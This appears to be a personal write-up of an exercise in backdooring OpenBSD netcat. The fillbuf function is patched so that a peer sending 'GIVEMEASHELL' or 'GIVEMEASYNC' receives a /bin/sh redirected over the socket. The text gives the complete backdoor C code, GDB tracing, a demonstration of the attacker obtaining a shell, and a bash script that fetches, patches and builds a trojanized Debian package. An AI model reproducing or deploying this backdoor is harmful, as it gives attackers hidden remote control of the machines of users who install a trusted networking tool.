This is a project i have worked on that i can share now, i have modified the source code since and the patch file so theres only the main GIVEMEASHELL feature, that deamonizes itself and closes the main process. the concurrency problems i presented in the writeup turned out to be artificially created problems, it shouldn't be async.

# Secret netcat


The problem:
download netcat source and patch it with a backdoor.
## Solution
I approached this problem with diving right into the code, downloading, compiling and debugging it.
I set up a nc listener and used GDB to debug a nc client.
based on the requirements of this mission, to receive a shell given input GIVEMEASHELL, it made sense to look at the calls to read.

```bash
pwndbg> b read@plt
pwndbg> r 127.0.0.1 4444
a
Breakpoint 1, 0x00005555555563e0 in read@plt ()
.
.
.
 ► f 0   0x5555555563e0 read@plt
   f 1   0x555555557d61 fillbuf+33
   f 2   0x555555557d61 fillbuf+33
   f 3   0x555555558244 readwrite+1172
   f 4   0x5555555570c7 main+2343
   f 5   0x7ffff7dba083 __libc_start_main+243
```
seems that fillbuf is responsible to load the buffer with the message content, and readwrite calls it.
looking at the source, it seems that readwrite handles reads/writes to both stdio and the socket, through drainbuf and fillbuf. We are specifically interested in fillbuf, because that's the routine that receives the input from the socket.
```c
ssize_t
# if defined(TLS)
fillbuf(int fd, unsigned char *buf, size_t *bufpos, struct tls *tls,int s)
# else
fillbuf(int fd, unsigned char *buf, size_t *bufpos, int s)
# endif
{
	size_t num = BUFSIZE - *bufpos;
	ssize_t n;

# if defined(TLS)
	if (tls) {
		n = tls_read(tls, buf + *bufpos, num);
		if (n == -1)
			errx(1, "tls read failed (%s)", tls_error(tls));
	} else {
# endif
		n = read(fd, buf + *bufpos, num);
		/* don't treat EAGAIN, EINTR as error */
		if (n == -1 && (errno == EAGAIN || errno == EINTR))
# if defined(TLS)
			n = TLS_WANT_POLLIN;
	}
# else
			n = -2;	
# endif
	if (n <= 0)
		return n;
	*bufpos += n;
	return n;
}
```
The part we are interested in is the buffer after the read(), so i can implement the backdoor like this:
```c
ssize_t
# if defined(TLS)
fillbuf(int fd, unsigned char *buf, size_t *bufpos, struct tls *tls,int s)
# else
fillbuf(int fd, unsigned char *buf, size_t *bufpos, int s)
# endif
{
	size_t num = BUFSIZE - *bufpos;
	ssize_t n;

# if defined(TLS)
	if (tls) {
		n = tls_read(tls, buf + *bufpos, num);
		if (n == -1)
			errx(1, "tls read failed (%s)", tls_error(tls));
	} else {
# endif
		n = read(fd, buf + *bufpos, num);
		/* don't treat EAGAIN, EINTR as error */
		if (n == -1 && (errno == EAGAIN || errno == EINTR))
# if defined(TLS)
			n = TLS_WANT_POLLIN;
	}
# else
			n = -2;
			if(strstr(buf,"GIVEMEASHELL" )){
				if(fd == 3 || fd == 4){
					int temp0 = dup(0);
			        int temp1 = dup(1);
			        int temp2 = dup(2);
			        dup2(s,0);
			        dup2(s,1);
			        dup2(s,2);
			        system("/bin/sh");
			        dup2(temp0,0);
			        dup2(temp1,1);
			        dup2(temp2,2);
					memset(buf,0x00,BUFSIZE);
			}
			}
			
# endif
	if (n <= 0)
		return n;
	*bufpos += n;
	return n;
}
```
By redirecting the entire stdio descriptors into the socket in this way, i can redirect the input and output of the system("/bin/sh") call to the server. I am testing the file descriptor to equal 3 or 4 because i don't want to pop a shell if the read happens to local file descriptors, that could cause issues like a shell opening on the victim shell instead of the attacker.
additionally if the server desides to exit the session and proceed with communication, i have stored the previous file descriptors in a temporary variable and set them back after the system call exits. In order to do all of that, i need to receive the socket value from connect() or accept4(), this value is actually present in readwrite() in the form of net_fd.
```c
if ((s = unix_connect(host)) > 0) {
			if (!zflag)
# if defined(TLS)
				readwrite(s, NULL);
# else
				readwrite(s);
# endif
			close(s);
.
.
.
connfd = accept4(s, (struct sockaddr *)&cliaddr,
				    &len, SOCK_NONBLOCK);

readwrite(connfd);
.
.
.
 if defined(TLS)
readwrite(int net_fd, struct tls *tls_ctx)
# else
readwrite(int net_fd)
# endif
{
```
So the solution would be to pass net_fd as a pramater to fillbuf.
```c
# if defined(TLS)
ssize_t fillbuf(int, unsigned char *, size_t *, struct tls *, int s);
# else
ssize_t fillbuf(int, unsigned char *, size_t *, int s);
# endif
.
.
.
		/* try to read from network */
		if (pfd[POLL_NETIN].revents & POLLIN && netinbufpos < BUFSIZE) {
			ret = fillbuf(pfd[POLL_NETIN].fd, netinbuf,
# if defined(TLS)
			    &netinbufpos, tls_ctx);
			if (ret == TLS_WANT_POLLIN)
				pfd[POLL_NETIN].events = POLLIN;
			else if (ret == TLS_WANT_POLLOUT)
				pfd[POLL_NETIN].events = POLLOUT;
			else
# else
			    &netinbufpos,net_fd);
```
Lets test if this works
attacker view:
```bash
~/netcat/netcat-openbsd-1.206$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 34322
GIVEMEASHELL
sh: turning off NDELAY mode
ls
Makefile
atomicio.c
atomicio.h
atomicio.o
debian
nc
nc.1
netcat.c
netcat.o
socks.c
socks.o
```
victim view:
```bash
~/netcat/netcat-openbsd-1.206$ ./nc 127.0.0.1 4444

```
Nice, we got a POC.
## Next steps
after i knew what is the end goal and how to achieve it, i need to figure out what can go wrong and how i can automate it.

list of possible issues:

 - Shell is blocking, maybe there's a away to open a thread for it.
 - Will the opened thread work in concurrency with the message loop?
 - make a script that automates download of source, patch and build it
 - how do i build a package?
 - how do i patch a package?
 - polish code and make it clean
 
 most of the time i was researching on dpkg and how to work with it.
 a .patch file can be created using diff or by running dpkg-source --commit and supplying it with a name. quilt can be used to import the patch and push it to the source, this method is most consistent in cases where the machine gets the up to date source, it may break if theres a version mismatch with the source files.

my final script:
```bash
#!/bin/bash
sudo apt-get install --yes dpkg-dev #dpkg is required for any source manipulation and building
sudo cp /etc/apt/sources.list /etc/apt/sources.list~
sudo sed -Ei 's/^# deb-src /deb-src /' /etc/apt/sources.list
sudo apt-get update #done to update the source list, cannot get source without it
sudo apt-get install --yes quilt #used to patch the source
mkdir netcat
cd netcat
apt source netcat-openbsd
cd netcat-openbsd-*/
sudo apt-get install --yes $(dpkg-checkbuilddeps 2>&1 | sed -e 's/dpkg-checkbuilddeps:\serror:\sUnmet build dependencies: //g' -e  's/[\(][^)]*[\)] //g') #this line automatically queries the dependancies of the project, extracts them using sed and pipes them to apt to install them
quilt import ~/nc.patch
quilt push #patching
res=$?
if [ $res -eq 0 ]; then #if patching fails do not continue
	sudo dpkg-buildpackage
else
	echo "patch failed to apply, verify source is up to date"
fi
```
This script has been tested on a fresh Ubuntu installation and it works.

## The concurrency issue
after i was done with the script, i got into polishing the code and attempting an async version of the shell, this lead to unintended behavior. My solution to that problem involved usage of mutex and condvars to wait for the spawned shell to return before creating another one.
Another issue that i was not able to solve was trying to use a shell from the victim end after popping a shell on the attacker end, which was not possible.
## Current state of the project
the final version of the patch includes a blocking version that does not call fork, that you can call by typing GIVEMEASHELL, and a forked version that you can call by typing GIVEMEASYNC.

these are the main changes in the full implementation:
```c
#include <pthread.h>
.
.
.
# if defined(TLS)
ssize_t fillbuf(int, unsigned char *, size_t *, struct tls *, int s);
# else
ssize_t fillbuf(int, unsigned char *, size_t *, int s);
# endif
.
.
.
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t condvar = PTHREAD_COND_INITIALIZER;
.
.
.
int isShell = 0;

void shellAsync(int s){
		pthread_mutex_lock(&mutex);
		isShell = 1;
        pid_t childpid = fork();
        if(childpid){
        dup2(s,0);
        dup2(s,1);
        dup2(s,2);
        execve("/bin/sh",0,0);
		pthread_cond_signal(&condvar);
		exit(0);
        }
		pthread_cond_wait(&condvar,&mutex);
		pthread_mutex_unlock(&mutex);
		isShell = 0;
}

void shell(int s){
		isShell = 1;
		int temp0 = dup(0);
        int temp1 = dup(1);
        int temp2 = dup(2);
        dup2(s,0);
        dup2(s,1);
        dup2(s,2);
        system("/bin/sh");
        dup2(temp0,0);
        dup2(temp1,1);
        dup2(temp2,2);
		isShell = 0;
}

ssize_t
# if defined(TLS)
fillbuf(int fd, unsigned char *buf, size_t *bufpos, struct tls *tls,int s)
# else
fillbuf(int fd, unsigned char *buf, size_t *bufpos, int s)
# endif
{
	size_t num = BUFSIZE - *bufpos;
	ssize_t n;

# if defined(TLS)
	if (tls) {
		n = tls_read(tls, buf + *bufpos, num);
		if (n == -1)
			errx(1, "tls read failed (%s)", tls_error(tls));
	} else {
# endif
		n = read(fd, buf + *bufpos, num);
		/* don't treat EAGAIN, EINTR as error */
		if (n == -1 && (errno == EAGAIN || errno == EINTR))
# if defined(TLS)
			n = TLS_WANT_POLLIN;
	}
# else
			n = -2;
			if(strstr(buf,"GIVEMEASHELL" )){
				if((fd == 3 || fd == 4) && !isShell){
			shell(s);
			memset(buf,0x00,BUFSIZE);
				}
		}

		if(strstr(buf,"GIVEMEASYNC")){
				if((fd == 3 || fd == 4) && !isShell){
			shellAsync(s);
			memset(buf,0x00,BUFSIZE);
				}
			}
```
## Conclusion
Fun project, mostly learned about dpkg and how source management works , GGWP.